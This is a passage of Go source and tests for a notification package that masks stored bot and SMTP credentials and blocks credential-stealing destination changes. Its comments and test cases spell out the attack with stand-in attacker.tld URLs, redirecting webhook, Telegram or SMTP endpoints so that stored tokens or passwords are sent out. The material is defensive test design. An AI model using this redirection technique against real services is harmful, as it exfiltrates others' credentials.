package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of a masked value. When the API echoes a
// credential it replaces the real content with a value carrying this prefix, and
// when the update API receives a value carrying this prefix it understands it as
// "keep the original value in the database unchanged".
//
// A prefix rather than an empty string or some fixed constant is used so that a
// bit of recognizable information can come along (see MaskedValue), letting the
// user tell "which bot this is" without re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__"              original value too short, no hint given
//	"__masked__:…ab12cd"      carries the last 6 characters of the original as a hint
//
// Exposing only the last 6 characters is a deliberate choice: the recognizable
// part of a webhook address is at its end (e.g. WeCom's key, Feishu's bot id),
// while the prefix part is the same across bots and has no discriminative value.
// The last 6 characters are not enough to reconstruct the credential, but enough
// for the person who configured it to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. echoed by the API and
// not modified).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the configuration with the channel's credential
// fields replaced by masked values.
//
// An unknown channel kind returns an empty map instead of the original
// configuration — better to let the UI show "configuration unavailable" than to
// spit back raw content that may contain credentials when the channel kind
// cannot be recognized. Non-credential fields are kept as-is so the UI renders
// normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as one credential as a whole:
		// judging sub-keys one by one would require every channel to declare yet
		// another set of "which sub-keys are credentials" rules, a complexity far
		// beyond the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination address
// changed, but the caller did not take a position on the credential fields".
// Returning it instead of silently allowing or silently dropping credentials —
// see PrepareConfigUpdate for the rationale.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys not explicitly declared
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "destination address (" + strings.Join(e.Changed, ", ") + ") has changed; please also re-fill the credential fields (" +
		strings.Join(e.Missing, ", ") + "): enter a new value, or explicitly leave it empty to indicate the credential is no longer needed. " +
		"The original credential is only valid for the old address; continuing to use it amounts to handing it to the new address."
}

// PrepareConfigUpdate merges channel configuration and handles the
// security-sensitive case of "the destination address changed".
//
// It replaces a bare MergeConfig on the channel update path, addressing a
// verified feasible attack path: the destination address (where messages go) and
// the credentials (under which identity they are sent) are two independent sets
// of fields, and MergeConfig keeps the stored value for any "unmentioned key".
// So anyone who can PATCH a channel can **change only the address while saying
// nothing about the credentials**, and have the server send the stored real
// credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<realToken>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → username and password handed over after STARTTLS
//
// This path is completely silent, does not rely on redirects (so refusing
// cross-host redirects cannot stop it), and directly defeats the goal of this
// package's masking mechanism — "credentials are never echoed back to the
// browser".
//
// Rule: whenever a destination key is changed to a new value, the caller must
// take an explicit position on **every** credential key:
//   - provide a new value → use the new value
//   - explicitly pass an empty string → the field no longer needs a credential
//     (clearing semantics preserved)
//   - pass back the masked value as-is / omit the key entirely → reject
//
// The third case is rejected too because the meaning of "masked value" is
// precisely "keep the old credential", and the old credential is only valid for
// the old address. Deliberately no "auto-drop credentials" here — for optional
// credential fields (webhook's headers, email's password) that would silently
// turn into "auth is gone but the API returned 200", which is harder to
// troubleshoot than an error. Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel kind %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook's headers is an object) has
	// a masked literal embedded in it, the caller has stuffed the "keep original"
	// sentinel inside a structure. MergeConfig only recognizes "a string with the
	// prefix" as masked, and this shape would be stored as an ordinary object —
	// the literal "__masked__" really lands in the database, and authentication
	// silently fails afterwards with no error anywhere. Better to reject it.
	//
	// This check must come **first**: when the address has not changed there is
	// an early return, and placing it later would cover only the "address
	// changed" path (the first version got exactly this wrong, and the test
	// caught it right away).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were actually changed. A masked value counts
	// as "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged: ordinary merge (masked values keep the original,
		// empty strings clear, everything else overwrites).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require an explicit position on every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions that embed the masking sentinel
// inside non-string structures.
//
// The masking mechanism rests on the premise that "the whole value is a string".
// Object fields like webhook's headers can only be masked as a whole (written as
// the string "__masked__") or submitted as a whole; stuffing the sentinel inside
// the object can neither express "keep unchanged" nor avoid being stored as a
// real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the masking marker %q: this field can only be left empty as a whole to keep the original, or submitted as a whole with a new value; embedding a masking placeholder inside a structure is not allowed",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two configuration values for equivalence. Comparing
// via JSON serialization also smooths over type differences — the frontend
// submits the port as a number while the database reads it back as float64, and
// a plain == would misjudge.
//
// "Empty" must be normalized before comparing: an empty string and "key absent"
// are the same state in this configuration model, because MergeConfig treats an
// empty string as an explicit clear and deletes the key outright. Without
// normalization, an always-empty optional destination field (Telegram's base_url
// is the only such field: empty means use the official address) would go down
// this path —
//
//	stored as base_url:"" at creation  →  first save: MergeConfig deletes the key
//	→ second save: incoming is "" while stored lacks the key, judged as "address changed"
//	→ credential is a masked value → 400 "destination address has changed, please re-fill the credential fields"
//
// and every save from then on fails unless the user re-pastes the Bot Token,
// even though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a configuration value is "empty".
// The convention must agree with MergeConfig's clearing check
// (strings.TrimSpace(s) == ""), otherwise there is a crack where "MergeConfig
// thinks it should be deleted but sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, used to update channel
// configuration.
//
// Rules:
//   - keys whose incoming value is masked → keep the stored value (the user did
//     not change this field)
//   - keys whose incoming value is an empty string → treated as an explicit
//     clear, the key is deleted
//   - all other keys → overwritten with the incoming value
//   - keys present in stored but absent from incoming → kept (partial update
//     semantics)
//
// Whether an empty string counts as "clear" needs to be explicit: the frontend
// form submits unfilled fields as empty strings, and writing them in as valid
// values would really clear the "leave empty to keep the original" fields. The
// choice here is explicit clearing, because the user has no other way to express
// removing a misconfigured field (dragging the field away could distinguish "not
// provided" from "provided empty", but the UI does not use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}

package notify

import (
	"errors"
	"strings"
	"testing"
)

func TestMaskedValueHidesBodyButKeepsTailHint(t *testing.T) {
	const secret = "https://oapi.dingtalk.com/robot/send?access_token=abcdef123456"
	got := MaskedValue(secret)
	if strings.Contains(got, "abcdef123456") {
		t.Fatalf("masked value leaked the full credential: %q", got)
	}
	if strings.Contains(got, "oapi.dingtalk.com") {
		t.Fatalf("masked value should not expose the address body: %q", got)
	}
	// The last 6 characters must be kept so the user can recognize which bot it is.
	if !strings.HasSuffix(got, "123456") {
		t.Fatalf("should keep the last 6 characters as an identification hint: %q", got)
	}
	if !IsMasked(got) {
		t.Fatalf("a masked value must be recognized by IsMasked: %q", got)
	}
}

func TestMaskedValueShortSecretGivesNoHint(t *testing.T) {
	// If a short credential also exposed its last 6 characters, that would expose
	// the entire credential.
	for _, s := range []string{"abc", "abcdef", ""} {
		got := MaskedValue(s)
		if got != MaskedPrefix {
			t.Fatalf("a credential of length %d should give no tail hint, got %q", len(s), got)
		}
		if s != "" && strings.Contains(got, s) {
			t.Fatalf("masked value contains the original value: %q", got)
		}
	}
}

func TestMaskConfigMasksOnlySecrets(t *testing.T) {
	cfg := map[string]any{
		"webhook": "https://example.com/hook?token=SECRETVALUE",
		"secret":  "SECtest123456",
		"port":    float64(587),
		"host":    "smtp.example.com",
	}
	masked := MaskConfig(KindDingTalk, cfg)
	for _, k := range []string{"webhook", "secret"} {
		s, _ := masked[k].(string)
		if !IsMasked(s) {
			t.Errorf("%s should be masked, got %q", k, s)
		}
	}
	// Non-credential fields must be kept as-is, otherwise the UI cannot render.
	if masked["port"] != float64(587) {
		t.Errorf("non-credential field port should not be modified: %v", masked["port"])
	}
}

func TestMaskConfigUnknownKindReturnsEmpty(t *testing.T) {
	// When the channel kind cannot be recognized, better to let the UI show an
	// empty configuration than to spit back raw content that may contain
	// credentials.
	got := MaskConfig("nope", map[string]any{"webhook": "https://x/y?token=LEAK"})
	if len(got) != 0 {
		t.Fatalf("an unknown channel kind should return an empty configuration, got %v", got)
	}
}

func TestMaskConfigDoesNotMutateInput(t *testing.T) {
	// Masking is a display-layer behavior; it must not turn around and modify the
	// real values in the database.
	cfg := map[string]any{"webhook": "https://example.com/hook", "secret": "SECtest123456"}
	_ = MaskConfig(KindDingTalk, cfg)
	if IsMasked(cfg["secret"].(string)) {
		t.Fatal("MaskConfig mutated its input, which would cause the real credential to be overwritten by the masked value")
	}
}

func TestMergeConfigKeepsStoredOnMaskedIncoming(t *testing.T) {
	stored := map[string]any{"webhook": "https://real/hook", "secret": "REALSECRET", "method": "POST"}
	// The user only changed method; the browser submits masked values + the new
	// method.
	incoming := map[string]any{
		"webhook": MaskedValue("https://real/hook"),
		"secret":  MaskedValue("REALSECRET"),
		"method":  "PUT",
	}
	got := MergeConfig(stored, incoming)
	if got["webhook"] != "https://real/hook" || got["secret"] != "REALSECRET" {
		t.Fatalf("masked fields should keep the stored values, got %v", got)
	}
	if got["method"] != "PUT" {
		t.Fatalf("the modified field should take effect, got %v", got["method"])
	}
}

func TestMergeConfigEmptyStringClears(t *testing.T) {
	stored := map[string]any{"webhook": "https://real/hook", "secret": "REALSECRET"}
	got := MergeConfig(stored, map[string]any{"secret": ""})
	if _, ok := got["secret"]; ok {
		t.Fatalf("an empty string should clear the field, got %v", got)
	}
	// Unmentioned fields are kept (partial update semantics).
	if got["webhook"] != "https://real/hook" {
		t.Fatalf("unmentioned fields should be kept, got %v", got)
	}
}

func TestMergeConfigKeepsUnmentionedStoredKeys(t *testing.T) {
	stored := map[string]any{"host": "smtp.example.com", "port": float64(587), "password": "pw"}
	got := MergeConfig(stored, map[string]any{"port": float64(465)})
	if got["host"] != "smtp.example.com" || got["password"] != "pw" {
		t.Fatalf("unmentioned fields should be kept, got %v", got)
	}
	if got["port"] != float64(465) {
		t.Fatalf("mentioned fields should be updated, got %v", got["port"])
	}
}

// TestPrepareConfigUpdateBlocksDestinationSwap is the most important security
// invariant of this package: **changing the destination address must not carry
// the old credentials along**.
//
// These cases use inputs in the exact shape of the attack (change only the
// address, say nothing about the credentials) rather than "valid inputs to the
// defense logic" — testing only the latter would stay green even if the defense
// did nothing.
func TestPrepareConfigUpdateBlocksDestinationSwap(t *testing.T) {
	cases := []struct {
		name     string
		kind     string
		stored   map[string]any
		incoming map[string]any
		// wantMissing is the credential key expected to be named.
		wantMissing string
	}{
		{
			name: "generic webhook changing URL while trying to keep the Authorization header",
			kind: KindWebhook,
			stored: map[string]any{
				"url":     "https://legit.example.com/hook",
				"headers": map[string]any{"Authorization": "Bearer REAL-TOKEN"},
			},
			incoming:    map[string]any{"url": "https://attacker.tld/c"},
			wantMissing: "headers",
		},
		{
			name:        "Telegram changing base_url to send the Bot Token to its own endpoint",
			kind:        KindTelegram,
			stored:      map[string]any{"bot_token": "123456:REAL", "chat_id": "1", "base_url": "https://api.telegram.org"},
			incoming:    map[string]any{"base_url": "https://attacker.tld"},
			wantMissing: "bot_token",
		},
		{
			name:        "email changing the SMTP host to hand over the password",
			kind:        KindEmail,
			stored:      map[string]any{"host": "smtp.corp.com", "port": 587, "password": "REALPW", "from": "a@b.c", "to": []any{"d@e.f"}},
			incoming:    map[string]any{"host": "smtp.attacker.tld"},
			wantMissing: "password",
		},
		{
			name:        "email toggling TLS must also re-declare the password",
			kind:        KindEmail,
			stored:      map[string]any{"host": "smtp.corp.com", "port": 587, "tls": false, "password": "REALPW", "from": "a@b.c", "to": []any{"d@e.f"}},
			incoming:    map[string]any{"tls": true},
			wantMissing: "password",
		},
		{
			// Masked value = "keep the old credential", which must also be rejected
			// in the context of an address change.
			name:        "passing back masked credentials + new address",
			kind:        KindTelegram,
			stored:      map[string]any{"bot_token": "123456:REAL", "chat_id": "1", "base_url": "https://api.telegram.org"},
			incoming:    map[string]any{"base_url": "https://attacker.tld", "bot_token": MaskedValue("123456:REAL")},
			wantMissing: "bot_token",
		},
		{
			name:        "DingTalk changing the webhook while trying to keep the signing secret",
			kind:        KindDingTalk,
			stored:      map[string]any{"webhook": "https://oapi.dingtalk.com/robot/send?access_token=OLD", "secret": "REALSEC"},
			incoming:    map[string]any{"webhook": "https://attacker.tld/hook"},
			wantMissing: "secret",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			merged, err := PrepareConfigUpdate(tc.kind, tc.stored, tc.incoming)
			if err == nil {
				t.Fatalf("changing the address without re-declaring credentials should be rejected; got config %v", merged)
			}
			var target *ErrDestinationChangedWithoutCredentials
			if !errors.As(err, &target) {
				t.Fatalf("a dedicated error type should be returned so the API can give actionable guidance, got %T: %v", err, err)
			}
			found := false
			for _, m := range target.Missing {
				if m == tc.wantMissing {
					found = true
				}
			}
			if !found {
				t.Fatalf("the missing credential key %q should be named, got %v", tc.wantMissing, target.Missing)
			}
			// The error message must be able to guide the operator on how to fix it.
			if !strings.Contains(err.Error(), tc.wantMissing) {
				t.Errorf("error message should mention %q: %v", tc.wantMissing, err)
			}
		})
	}
}

// TestPrepareConfigUpdateAllowsLegitimateEdits is the counterpart: legitimate
// edits must not be blocked by mistake, otherwise this protection would get
// bypassed or deleted for being "too annoying".
func TestPrepareConfigUpdateAllowsLegitimateEdits(t *testing.T) {
	cases := []struct {
		name     string
		kind     string
		stored   map[string]any
		incoming map[string]any
	}{
		{
			name:     "only renaming (config passed back as-is)",
			kind:     KindWebhook,
			stored:   map[string]any{"url": "https://legit.example.com/hook", "headers": map[string]any{"Authorization": "Bearer REAL"}},
			incoming: map[string]any{"url": MaskedValue("https://legit.example.com/hook")},
		},
		{
			name:     "only changing the request method, address and credentials untouched",
			kind:     KindWebhook,
			stored:   map[string]any{"url": "https://legit.example.com/hook", "method": "POST"},
			incoming: map[string]any{"method": "PUT"},
		},
		{
			name:     "changing the address **and** providing new credentials",
			kind:     KindWebhook,
			stored:   map[string]any{"url": "https://old.example.com/hook", "headers": map[string]any{"Authorization": "Bearer OLD"}},
			incoming: map[string]any{"url": "https://new.example.com/hook", "headers": map[string]any{"Authorization": "Bearer NEW"}},
		},
		{
			name:     "changing the address and explicitly declaring the credential is no longer needed",
			kind:     KindWebhook,
			stored:   map[string]any{"url": "https://old.example.com/hook", "headers": map[string]any{"Authorization": "Bearer OLD"}},
			incoming: map[string]any{"url": "https://new.example.com/hook", "headers": ""},
		},
		{
			name:     "Telegram changing chat_id (not a destination)",
			kind:     KindTelegram,
			stored:   map[string]any{"bot_token": "t", "chat_id": "1", "base_url": "https://api.telegram.org"},
			incoming: map[string]any{"chat_id": "-100200"},
		},
		{
			name:     "email changing recipients (not a destination)",
			kind:     KindEmail,
			stored:   map[string]any{"host": "smtp.corp.com", "port": 587, "password": "PW", "from": "a@b.c", "to": []any{"x@y.z"}},
			incoming: map[string]any{"to": []any{"new@y.z"}},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			merged, err := PrepareConfigUpdate(tc.kind, tc.stored, tc.incoming)
			if err != nil {
				t.Fatalf("legitimate edit was blocked by mistake: %v", err)
			}
			if merged == nil {
				t.Fatal("should return a merged result")
			}
		})
	}
}

// TestPrepareConfigUpdatePortTypeTolerance covers a detail that is easy to
// misjudge: the frontend submits the port as a JSON number (float64) and the
// database reads it back as float64 too, but the two values can have different
// types (e.g. int vs float64). Comparing with == would judge "unchanged" as
// "changed", popping "please re-fill the password" at a user who only renamed
// the channel — false alarms teach people to stop trusting this protection.
func TestPrepareConfigUpdatePortTypeTolerance(t *testing.T) {
	stored := map[string]any{"host": "smtp.corp.com", "port": float64(587), "password": "PW"}
	// The same port, submitted as an int.
	if _, err := PrepareConfigUpdate(KindEmail, stored, map[string]any{"port": 587}); err != nil {
		t.Fatalf("an identical port value (type aside) should not be judged as an address change: %v", err)
	}
	// Really changing the port must be blocked.
	if _, err := PrepareConfigUpdate(KindEmail, stored, map[string]any{"port": 25}); err == nil {
		t.Fatal("a port change should be blocked")
	}
}

// TestPrepareConfigUpdateSurvivesRepeatedSaveWithBlankDestination covers the
// path of "a destination field that may be left blank": Telegram's base_url left
// empty means use the official API address.
//
// This once made the channel fail to save permanently starting from the second
// save:
//
//	at creation, base_url:"" is stored (the creation path stores the frontend-submitted
//	config directly, without going through MergeConfig)
//	→ first save: MergeConfig treats the empty string as an explicit clear and deletes the key
//	→ second save: incoming is still "" while stored no longer has the key, judged as "address changed"
//	→ bot_token is the masked echo value → 400 "destination address has changed, please re-fill the credential fields"
//
// The user changed nothing, yet could never save again unless they re-pasted the
// Bot Token.
func TestPrepareConfigUpdateSurvivesRepeatedSaveWithBlankDestination(t *testing.T) {
	stored := map[string]any{"bot_token": "123:ABC", "chat_id": "-100", "base_url": ""}

	// The frontend buildConfig() submits a value for every field definition of
	// this channel: credentials are back-filled with the masked value, and empty
	// text boxes submit empty strings. Reproduce its output in full here, rather
	// than submitting only "the changed keys".
	submit := func() map[string]any {
		return map[string]any{
			"bot_token": MaskedValue("123:ABC"),
			"chat_id":   "-100",
			"base_url":  "",
		}
	}

	// First save: only the channel name changed; config is passed back as-is.
	merged, err := PrepareConfigUpdate(KindTelegram, stored, submit())
	if err != nil {
		t.Fatalf("first save was blocked by mistake: %v", err)
	}
	if _, ok := merged["base_url"]; ok {
		t.Fatal("precondition changed: the empty string should have been deleted by MergeConfig — what this case covers is exactly the step 'after the key disappears'")
	}

	// Second save: the submission is identical to last time; the user changed
	// nothing.
	merged2, err := PrepareConfigUpdate(KindTelegram, merged, submit())
	if err != nil {
		t.Fatalf("second save was blocked by mistake (user changed nothing): %v", err)
	}
	// Third time, to confirm saving works stably rather than failing only once.
	if _, err := PrepareConfigUpdate(KindTelegram, merged2, submit()); err != nil {
		t.Fatalf("third save was blocked by mistake: %v", err)
	}
	// The credential must survive all the way through, not cleared by the
	// empty-string logic.
	if got := merged2["bot_token"]; got != "123:ABC" {
		t.Fatalf("Bot Token should keep the original value, got %v", got)
	}
}

// TestPrepareConfigUpdateStillGuardsBlankDestinationChanges is the paired
// assertion of the previous case: treating an empty string and "key absent" as
// equivalent must **not** also let real address changes through. Both directions
// are real credential exfiltration paths — Telegram's Bot Token travels in the
// URL path, so changing base_url means handing the Token to the new address.
func TestPrepareConfigUpdateStillGuardsBlankDestinationChanges(t *testing.T) {
	// Direction one: from "empty" (the official address) to a self-hosted one.
	official := map[string]any{"bot_token": "123:ABC", "chat_id": "-100"}
	if _, err := PrepareConfigUpdate(KindTelegram, official, map[string]any{
		"bot_token": MaskedValue("123:ABC"),
		"base_url":  "https://tg-proxy.attacker.tld",
	}); err == nil {
		t.Fatal("switching from the official address to a self-hosted one must require re-entering the Token")
	}

	// Direction two: clearing a self-hosted address (= switching back to the
	// official API) is likewise an address change.
	proxied := map[string]any{"bot_token": "123:ABC", "base_url": "https://proxy.internal/bot"}
	if _, err := PrepareConfigUpdate(KindTelegram, proxied, map[string]any{
		"bot_token": MaskedValue("123:ABC"),
		"base_url":  "",
	}); err == nil {
		t.Fatal("clearing a self-hosted address (switching back to the official API) is likewise an address change and must require re-entering the Token")
	}
}

func TestDestinationKeysDeclaredForEveryKind(t *testing.T) {
	// Same as SecretKeys: if a channel forgets to declare its destination keys,
	// PrepareConfigUpdate cannot protect it.
	for kind, ch := range registry {
		if len(ch.DestinationKeys()) == 0 {
			t.Errorf("channel %s declares no destination keys; the protection against address changes carrying credentials is ineffective for it", kind)
		}
		if len(ch.SecretKeys()) == 0 {
			t.Errorf("channel %s declares no credential keys", kind)
		}
	}
}

func TestSecretKeysDeclaredForEveryKind(t *testing.T) {
	// The compiler already forces every channel to implement SecretKeys; this
	// double-checks that "no channel turns in a blank sheet on masking" — a
	// channel returning an empty slice means its credentials would be echoed to
	// the browser in plaintext.
	expect := map[string]bool{
		KindDingTalk: true, KindFeishu: true, KindWeCom: true,
		KindWebhook: true, KindTelegram: true, KindEmail: true,
	}
	for kind, ch := range registry {
		if !expect[kind] {
			t.Errorf("channel %s is not registered with a masking expectation in the test", kind)
			continue
		}
		if len(ch.SecretKeys()) == 0 {
			t.Errorf("channel %s declares no credential fields; its configuration would be echoed in plaintext", kind)
		}
	}
}

// TestPrepareConfigUpdateRejectsMaskedInContainer covers a gap pointed out in
// review: when the masking sentinel is stuffed into a **non-string** structure
// (e.g. webhook.headers is an object), MergeConfig only recognizes "a string with
// the prefix" as masked, so the literal "__masked__" would be stored as a real
// header value — authentication silently fails afterwards, with no error
// anywhere.
func TestPrepareConfigUpdateRejectsMaskedInContainer(t *testing.T) {
	stored := map[string]any{
		"url":     "https://legit.example.com/hook",
		"headers": map[string]any{"Authorization": "Bearer REAL"},
	}
	// Masking sentinel embedded inside an object.
	incoming := map[string]any{
		"headers": map[string]any{"Authorization": MaskedPrefix},
	}
	if _, err := PrepareConfigUpdate(KindWebhook, stored, incoming); err == nil {
		t.Fatal("a masking sentinel embedded inside a structure should be rejected (otherwise the literal gets stored)")
	}
	// Submitting the object as a whole (a real new value) is accepted as usual.
	ok := map[string]any{"headers": map[string]any{"Authorization": "Bearer NEW"}}
	if _, err := PrepareConfigUpdate(KindWebhook, stored, ok); err != nil {
		t.Fatalf("submitting new request headers normally should not be blocked: %v", err)
	}
}

// Package notify implements the IM / email push channel adapters for vulnerability
// findings.
//
// Layering: this package is a **leaf package** that depends only on the standard
// library. It knows neither the database nor server. Channel configuration is
// passed in as map[string]any (corresponding to the notification_channels.config
// JSONB column), and the content to push is passed in as a Message. The benefit of
// this split is that the truly error-prone parts — signature computation, UTF-8
// truncation, filter matching — can be unit-tested without PostgreSQL, while the
// host only does orchestration on the server side.
//
// Concurrency contract: Channel implementations must be **stateless**. The same
// Channel instance is shared concurrently by multiple channel configurations (even
// multiple bot instances of the same channel); all credentials are passed in via
// the cfg parameter, and caching things like a webhook URL into fields of the
// implementation itself is not allowed.
package notify

// Channel kind identifiers. The values are also the valid set of
// notification_channels.kind, whitelisted on the server side (same approach as
// findings.status — no DB CHECK constraint, so adding channels later is easy).
const (
	KindDingTalk = "dingtalk" // DingTalk custom bot
	KindFeishu   = "feishu"   // Feishu (incl. Lark) custom bot
	KindWeCom    = "wecom"    // WeCom group bot
	KindWebhook  = "webhook"  // Generic webhook: custom method/headers/JSON template
	KindTelegram = "telegram" // Telegram Bot API
	KindEmail    = "email"    // SMTP email
)

// Event kinds, corresponding to notification_events.kind.
const (
	EventFindingCreated       = "finding_created"
	EventFindingStatusChanged = "finding_status_changed"
)

// InitKind is the fallback value for an empty kind in config.
const InitKind = KindDingTalk

// severityRank maps vulnerability severity to comparable ordinals. Unknown
// severities return 0, so any min_severity setting keeps unknown severities
// out — when in doubt, do not push, to avoid false-positive floods.
var severityRank = map[string]int{
	"low":      1,
	"medium":   2,
	"high":     3,
	"critical": 4,
}

// SeverityRank returns the ordinal of a severity; unknown severities return 0.
func SeverityRank(severity string) int { return severityRank[severity] }

// SeverityLabel returns the severity name with an emoji, used in message titles
// and card coloring. Unknown severities are echoed as-is, never invented.
func SeverityLabel(severity string) string {
	switch severity {
	case "critical":
		return "🔴 Critical"
	case "high":
		return "🟠 High"
	case "medium":
		return "🟡 Medium"
	case "low":
		return "🔵 Low"
	default:
		return severity
	}
}

// StatusLabel maps a handling status to a human-readable label, used in
// status-change messages.
func StatusLabel(status string) string {
	switch status {
	case "pending":
		return "Pending"
	case "in_progress":
		return "In progress"
	case "confirmed":
		return "Confirmed"
	case "resolved":
		return "Resolved"
	case "fixed":
		return "Fixed"
	case "false_positive":
		return "False positive"
	case "ignored":
		return "Ignored"
	case "duplicate":
		return "Duplicate"
	case "risk_accepted":
		return "Risk accepted"
	default:
		return status
	}
}

// AtLeast reports whether severity reaches the min threshold. An empty min means
// no threshold, everything passes. Note that unknown severities have ordinal 0
// and are rejected by any non-empty min (see the severityRank comment).
func AtLeast(severity, min string) bool {
	if min == "" {
		return true
	}
	return SeverityRank(severity) >= SeverityRank(min)
}

FILE: notify/pack_test.go

package notify

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"unicode/utf8"
)

// This file covers the "pack whole items" fix: when a digest message exceeds the
// channel's length limit, it must be truncated **item by item** and honestly
// report how many items did not fit, so the caller marks only the ones actually
// delivered.
//
// The previous approach rendered the whole thing, truncated it, and then marked
// the whole batch as delivered: the second half of the message vanished into
// thin air while the delivery history showed all succeeded — vulnerabilities
// were simply lost, and nowhere could you find out.

func TestMarkdownBodyPacksWholeItemsWithinByteLimit(t *testing.T) {
	// 200 digest items are guaranteed to far exceed WeCom's 4096 bytes.
	m := batchMsg(200)
	body, kept := markdownBody(m, weComMarkdownLimit)

	if len(body) > weComMarkdownLimit {
		t.Fatalf("body of %d bytes exceeds the limit of %d", len(body), weComMarkdownLimit)
	}
	if !utf8.ValidString(body) {
		t.Fatal("body is not valid UTF-8")
	}
	if kept <= 0 || kept >= len(m.Items) {
		t.Fatalf("only a part should fit (0 < kept < %d), got %d", len(m.Items), kept)
	}
	// The header must honestly state how many items this message contains and how
	// many remain — otherwise readers take the number in the header for the whole
	// batch.
	if !strings.Contains(body, "remaining") || !strings.Contains(body, "next message") {
		t.Fatalf("the header should state how many items are not included in this message:\n%s", body[:minInt(400, len(body))])
	}
	// Only the first kept items should be included.
	for i := 0; i < kept; i++ {
		if !strings.Contains(body, "vuln"+itoa(i+1)) {
			t.Fatalf("item %d should be in this message:\n%s", i+1, body)
		}
	}
	if strings.Contains(body, "vuln"+itoa(kept+1)) {
		t.Fatalf("item %d should not appear (it belongs to the next batch)", kept+1)
	}
}

func TestMarkdownBodyKeepsEverythingWhenUnderLimit(t *testing.T) {
	m := batchMsg(3)
	body, kept := markdownBody(m, 0) // 0 = unlimited
	if kept != len(m.Items) {
		t.Fatalf("everything should be kept when length is unlimited, got kept=%d", kept)
	}
	if strings.Contains(body, "remaining") {
		t.Fatalf("no truncation notice should appear when nothing was truncated:\n%s", body)
	}
}

func TestMarkdownBodyAlwaysKeepsAtLeastOneItem(t *testing.T) {
	// When the budget is too small to fit even one item, still send one (with
	// final truncation as the backstop). Otherwise a single oversized
	// vulnerability would permanently jam the whole batch in place: never fitting
	// on every claim, never sent.
	m := batchMsg(5)
	_, kept := markdownBody(m, 50)
	if kept != 1 {
		t.Fatalf("at least 1 item should be kept, got %d", kept)
	}
}

func TestMarkdownBodySingleReturnsOne(t *testing.T) {
	_, kept := markdownBody(singleMsg(), 4096)
	if kept != 1 {
		t.Fatalf("a single message should report 1 delivered, got %d", kept)
	}
	// An empty message has no items to deliver.
	if _, k := markdownBody(Message{}, 4096); k != 0 {
		t.Fatalf("an empty message should report 0 items, got %d", k)
	}
}

func TestTelegramPackingUsesRuneBudget(t *testing.T) {
	m := batchMsg(200)
	text, kept := telegramHTML(m)
	// Telegram limits by **character count**; measuring in bytes would cram a
	// CJK message down to a third.
	if n := utf8.RuneCountInString(text); n > telegramTextLimit {
		t.Fatalf("body of %d characters exceeds the limit of %d", n, telegramTextLimit)
	}
	if kept <= 0 || kept >= len(m.Items) {
		t.Fatalf("only a part should fit, got %d", kept)
	}
	if !strings.Contains(text, "next message") {
